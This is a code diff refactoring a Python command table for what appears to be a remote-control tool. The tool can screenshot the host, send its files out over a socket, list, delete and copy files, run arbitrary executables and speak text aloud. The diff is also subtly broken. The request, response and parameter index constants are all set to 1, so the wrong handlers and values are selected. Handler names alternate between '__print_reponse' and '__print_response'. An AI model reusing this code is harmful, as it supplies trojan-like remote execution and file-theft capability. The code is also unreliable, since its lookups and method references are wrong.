@@ -16,14 +16,14 @@ class Commands(object):
         The commands in the format of - command's name : (command's function, command's parameters)
         :return:
         """
-        return {'Take Screen Shot': (Commands.__take_screenshot_command, []),
-                'Download File': (Commands.__send_file_command, ['File Name']),
-                'Dir': (Commands.__dir_command, []),
-                'Delete File': (Commands.__delete_command, ['File Name']),
-                'Copy File': (Commands.__copy_command, ['Source', 'Destination']),
-                'Execute': (Commands.__execute_command, ['Executable File']),
-                'Text To Speech': (Commands.text_to_speech, ['The Text To Say']),
-                'Disconnect': (Commands.__disconnect_command, [])}
+        return {'Take Screen Shot': (Commands.__take_screenshot_request, Commands.__print_reponse, []),
+                'Download File': (Commands.__send_file_request, Commands.__send_file_reponse, ['File Name']),
+                'Dir': (Commands.__dir_request, Commands.__print_reponse, []),
+                'Delete File': (Commands.__delete_request, Commands.__print_response, ['File Name']),
+                'Copy File': (Commands.__copy_request, Commands.__print_response, ['Source', 'Destination']),
+                'Execute': (Commands.__execute_request, Commands.__print_reponse, ['Executable File']),
+                'Text To Speech': (Commands.__text_to_speech_request, Commands.__print_response, ['The Text To Say']),
+                'Disconnect': (Commands.__disconnect_request, Commands.__print_response, [])}
 
     """-----------------THE CONSTS-----------------"""
     # the number of digits the length of the messages sending
@@ -34,11 +34,15 @@ class Commands(object):
     SEPARATE_CHAR = '|'
     # the number of images taken
     __image_number = 0
+    # indexes in the dictionary
+    __REQUEST_INDEX = 1
+    __RESPONSE_INDEX = 1
+    __PARAM_INDEX = 1
 
     """-----------------COMMANDS REQUESTS HANDLERS-----------------"""
 
     @staticmethod
-    def __take_screenshot_command(socket):
+    def __take_screenshot_request(socket):
         # get the picture name
         picture_name = ""
         # take a screen shot
@@ -52,30 +56,30 @@ class Commands(object):
         # save the image with the image name as a png image
         im.save(picture_name+".png", "PNG")
         # return "saved at " + the picture's name
-        return "saved at " + str(picture_name)
+        return "Saved at " + str(picture_name)
 
     @staticmethod
-    def __copy_command(src, dest):
+    def __copy_request(src, dest):
         copy(src, dest)
-        return 'copied %s to %s' % (str(src), str(dest))
+        return 'Copied %s to %s' % (str(src), str(dest))
 
     @staticmethod
-    def __execute_command(to_execute):
+    def __execute_request(to_execute):
         subprocess.call(to_execute)
         return 'Executed %s' % str(to_execute)
 
     @staticmethod
-    def __delete_command(to_delete):
+    def __delete_request(to_delete):
         os.remove(to_delete)
         return 'Deleted %s' % str(to_delete)
 
     @staticmethod
-    def __dir_command(directory):
+    def __dir_request(directory):
         files_list = os.listdir(directory)
         return files_list
 
     @staticmethod
-    def __send_file_command(file_name):
+    def __send_file_request(file_name):
         # get the file's data as binary data
         with open(file_name, "rb") as f:
             data = f.read()
@@ -85,12 +89,13 @@ class Commands(object):
         return typ + Commands.SEPARATE_CHAR + data
 
     @staticmethod
-    def text_to_speech(text):
+    def __text_to_speech_request(text):
         sp = cl.Dispatch("SAPI.SpVoice")
         sp.Speak(text)
+        return 'Said "%s"' % text
 
     @staticmethod
-    def __disconnect_command():
+    def __disconnect_request():
         return 'Bye bye'
 
     """-----------------COMMANDS RELATED PUBLIC FUNCTIONS-----------------"""
@@ -117,10 +122,21 @@ class Commands(object):
     def handle_command_request(command_number, *args):
         """
         :param command_number: the command's number
-        :param args: a list of arguments to the command's handler
-        :return: the command's return value
+        :param args: a list of arguments to the command's request handler
+        :return: the command's request return value
         """
-        return Commands.__commands()[Commands.__commands().keys()[command_number]][0](*args)
+        commands = Commands.__commands()
+        return commands[commands.keys()[command_number]][Commands.__REQUEST_INDEX](*args)
+
+    @staticmethod
+    def handle_command_response(command_number, *args):
+        """
+        :param command_number: the command's number
+        :param args: a list of arguments to the command's response handler
+        :return: the command's response return value
+        """
+        commands = Commands.__commands()
+        return commands[commands.keys()[command_number]][Commands.__RESPONSE_INDEX](*args)
 
     @staticmethod
     def get_commands_parameters(command_name):
@@ -129,7 +145,7 @@ class Commands(object):
         :param command_name: the command's name
         :return: the given command's parameters
         """
-        return Commands.__commands()[command_name][1]
+        return Commands.__commands()[command_name][Commands.__PARAM_INDEX]
 
     """-----------------HELPER PUBLIC FUNCTIONS-----------------"""
 
